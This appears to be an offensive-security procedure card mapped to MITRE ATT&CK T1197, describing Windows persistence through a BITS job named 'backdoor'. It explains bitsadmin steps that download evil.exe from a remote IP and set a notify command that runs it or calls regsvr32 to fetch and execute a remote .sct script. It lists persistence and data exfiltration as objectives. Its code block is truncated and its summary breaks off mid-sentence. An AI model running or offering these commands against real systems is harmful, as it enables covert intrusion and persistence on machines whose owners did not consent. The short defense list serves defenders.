---
id: 79fc51aa-40b5-48ee-b9e6-45c815d00bed
name: BITS Job Persistence with Backdoor Command
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.911360+00:00'
updated_at: '2023-04-10T20:37:25.011920+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[BITS Jobs|T1197 - BITS Jobs]]'
tags:
- '[[BITS Jobs]]'
- '[[Simple User]]'
- '[[Windows - Persistence]]'
---

# BITS Job Persistence with Backdoor Command

## Summary

BITS (Background Intelligent Transfer Service) is a Windows service that transfers files asynchronously between machines using idle network bandwidth. This technique can be used to establish persistence by creating a BITS task that downloads and executes a backdoor command. The backdoor command can

## Description

# Description

BITS (Background Intelligent Transfer Service) is a Windows service that transfers files asynchronously between machines using idle network bandwidth. This technique can be used to establish persistence by creating a BITS task that downloads and executes a backdoor command. The backdoor command can be used to maintain access to the compromised machine, exfiltrate data, or perform other malicious activities. This technique can be difficult to detect because BITS jobs are often used for legitimate purposes and are not monitored by many security tools.

 

## Requirements

1. Access to a user account with permission to create BITS jobs

1. Ability to execute commands on the compromised machine

 

## Defense

1. Monitor for new BITS jobs and review their contents

1. Restrict user permissions to create BITS jobs

1. Use endpoint detection and response (EDR) tools to monitor for suspicious activity

 

## Objectives

1. Establish persistence on the compromised machine

1. Maintain access to the compromised machine

1. Exfiltrate data from the compromised machine

 

# Instructions

1. Use the bitsadmin command to create a backdoor and add a file to it. The command can be used in two ways, version 1 and version 2. Version 1 uses a local file while version 2 uses a remote file. The command also sets the minimum retry delay and resumes the backdoor.

 



**Code**: [[bitsadmin /create backdoor
bitsadmin /addfile back]]



> The bitsadmin command is used to create a backdoor and add a file to it. The /create option is used to create a new job named 'backdoor'. The /addfile option is used to add a file to the job. In version 1, the file is a local file named 'evil.exe' which is added to the job with the path 'C:\tmp\evil.exe'. In version 2, the file is a remote file which is downloaded from the URL 'http://10.10.10.10/evil.exe' and added to the job with the same path. The /SetNotifyCmdLine option is used to set the command to be executed when the job is complete. In version 1, the command is set to 'C:\tmp\evil.exe NUL' which means that the file is executed silently. In version 2, the command is set to 'regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"' which means that a script is executed using regsvr32.exe. The /SetMinRetryDelay option is used to set the minimum retry delay to 60 seconds. The /resume option is used to start the job.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[BITS Jobs|T1197 - BITS Jobs]]

## Tags

- [[BITS Jobs]]
- [[Simple User]]
- [[Windows - Persistence]]


